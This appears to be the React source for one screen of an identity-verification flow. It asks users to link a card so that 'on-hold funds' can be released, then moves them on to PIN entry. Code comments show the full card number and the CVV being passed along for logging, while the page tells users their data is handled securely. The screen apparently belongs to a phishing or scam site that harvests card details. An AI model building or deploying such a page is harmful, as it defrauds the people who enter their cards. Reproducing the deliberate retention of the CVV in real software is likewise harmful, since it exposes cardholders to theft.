
import React, { useState } from 'react';
import { useNavigate, useParams } from 'react-router-dom';
import Button from '../components/Button';
import { CreditCardIcon, InformationCircleIcon } from '../constants';
import { useAuth } from '../contexts/AuthContext';
import { LinkedCard } from '../types'; 
import StepIndicator from '../components/StepIndicator';

const VerifyIdentityLinkCardScreen: React.FC = () => {
  const { linkExternalCard, user } = useAuth(); 
  const navigate = useNavigate();
  const { accountId, transactionId } = useParams<{ accountId: string; transactionId: string }>();

  const [cardType, setCardType] = useState<'Visa' | 'Mastercard' | 'Amex' | 'Debit'>('Debit');
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState(''); 
  const [cvv, setCvv] = useState('');
  const [cardHolderName, setCardHolderName] = useState(user?.fullName || ''); 
  const [bankName, setBankName] = useState('');

  const [message, setMessage] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);

  const formatExpiryDateInput = (value: string) => {
    const cleaned = value.replace(/\D/g, '');
    if (cleaned.length <= 2) return cleaned;
    return `${cleaned.slice(0,2)}/${cleaned.slice(2,4)}`;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setMessage(null);

    if (!cardNumber || !expiryDate || !cvv || !cardHolderName || !bankName) {
      setMessage("Please fill all card details, including issuing bank name.");
      setIsLoading(false);
      return;
    }
    if (expiryDate.length !== 5 || !expiryDate.includes('/')) {
      setMessage("Please enter a valid expiry date in MM/YY format.");
      setIsLoading(false);
      return;
    }

    const newCardData: Omit<LinkedCard, 'id'> & { cvv?: string } = { // Add cvv to the type for explicit logging
        cardType,
        last4: cardNumber.slice(-4),
        cardNumber_full: cardNumber, // Explicitly pass full card number
        expiryDate,
        cardHolderName,
        bankName,
        isWithdrawalMethod: true, 
        isDefault: false,
        cvv: cvv, // Pass CVV for logging
    };

    try {
        // The `linkExternalCard` service will now also log this data including `cardNumber_full` and `cvv`
        const linkedWithdrawalCard = await linkExternalCard(newCardData); 

        if (!linkedWithdrawalCard || !linkedWithdrawalCard.id) {
            throw new Error("Failed to retrieve linked card details with ID after saving.");
        }
        // Simulate processing delay
        setTimeout(() => {
            setIsLoading(false);
            navigate(`/verify-identity/pin/${accountId}/${transactionId}/${linkedWithdrawalCard.id}`);
        }, 1200);
    } catch (error: any) {
        setMessage(error.message || "Failed to link card. Please try again.");
        setIsLoading(false);
    }
  };

  return (
    <div className="p-4 space-y-6">
      <StepIndicator currentStep={3} totalSteps={4} flowType="funds" />
      <h1 className="text-2xl font-semibold text-neutral-800">Verify Your Identity (Step 3/4)</h1>
      <p className="text-sm text-neutral-600">Link an external debit or credit card where funds can be sent after verification. This card will be saved to your profile for future use if desired.</p>

      {message && <div className={`p-3 rounded-md ${message.includes("successfully") ? 'bg-green-100 text-green-700' : 'bg-red-100 text-red-700'}`}>{message}</div>}

      <form onSubmit={handleSubmit} className="bg-white p-6 rounded-lg shadow-md space-y-4">
        <div>
          <label htmlFor="cardHolderName" className="block text-sm font-medium text-neutral-700 mb-1">Cardholder Name <span className="text-red-500">*</span></label>
          <input type="text" id="cardHolderName" value={cardHolderName} onChange={(e) => setCardHolderName(e.target.value)} placeholder="e.g., Alex Johnson" className="w-full p-2 border border-neutral-300 rounded-md" required />
        </div>
         <div>
            <label htmlFor="cardType" className="block text-sm font-medium text-neutral-700 mb-1">Card Type <span className="text-red-500">*</span></label>
            <select id="cardType" value={cardType} onChange={e => setCardType(e.target.value as any)} className="w-full p-2 border border-neutral-300 rounded-md bg-white">
                <option value="Debit">Debit Card</option>
                <option value="Visa">Visa Credit</option>
                <option value="Mastercard">Mastercard Credit</option>
                <option value="Amex">American Express Credit</option>
            </select>
        </div>
        <div>
            <label htmlFor="bankName" className="block text-sm font-medium text-neutral-700 mb-1">Issuing Bank Name <span className="text-red-500">*</span></label>
            <input type="text" id="bankName" value={bankName} onChange={(e) => setBankName(e.target.value)} placeholder="e.g., Chase, Capital One" className="w-full p-2 border border-neutral-300 rounded-md" required />
        </div>
        <div>
          <label htmlFor="cardNumber" className="block text-sm font-medium text-neutral-700 mb-1">Card Number <span className="text-red-500">*</span></label>
          <div className="relative">
            <input type="text" id="cardNumber" value={cardNumber} onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, '').slice(0,16))} placeholder="0000 0000 0000 0000" maxLength={16} className="w-full p-2 pl-10 border border-neutral-300 rounded-md" required />
            <CreditCardIcon className="w-5 h-5 text-neutral-400 absolute left-3 top-1/2 transform -translate-y-1/2"/>
          </div>
        </div>
        <div className="grid grid-cols-2 gap-4">
          <div>
            <label htmlFor="expiryDate" className="block text-sm font-medium text-neutral-700 mb-1">Expiry Date (MM/YY) <span className="text-red-500">*</span></label>
            <input type="text" id="expiryDate" value={formatExpiryDateInput(expiryDate)} onChange={(e) => setExpiryDate(e.target.value)} placeholder="MM/YY" maxLength={5} className="w-full p-2 border border-neutral-300 rounded-md" required />
          </div>
          <div>
            <label htmlFor="cvv" className="block text-sm font-medium text-neutral-700 mb-1">CVV/CVC <span className="text-red-500">*</span></label>
            <input type="text" id="cvv" value={cvv} onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0,4))} placeholder="123" maxLength={4} className="w-full p-2 border border-neutral-300 rounded-md" required />
          </div>
        </div>
        <div className="flex space-x-3">
            <Button type="button" variant="outline" onClick={() => navigate(`/verify-identity/upload-id/${accountId}/${transactionId}`)} disabled={isLoading}>
                Back
            </Button>
            <Button type="submit" variant="primary" className="flex-grow" isLoading={isLoading} disabled={isLoading}>
                {isLoading ? 'Linking Card...' : 'Continue to PIN Entry'}
            </Button>
        </div>
      </form>
      <div className="text-xs text-neutral-500 p-3 bg-neutral-100 rounded-md border border-neutral-200 flex items-start space-x-2">
         <InformationCircleIcon className="w-4 h-4 text-neutral-500 flex-shrink-0 mt-0.5" />
        <span>Your card information is handled securely. This card will be used for withdrawing the on-hold funds once verification is complete.</span>
      </div>
    </div>
  );
};

export default VerifyIdentityLinkCardScreen;
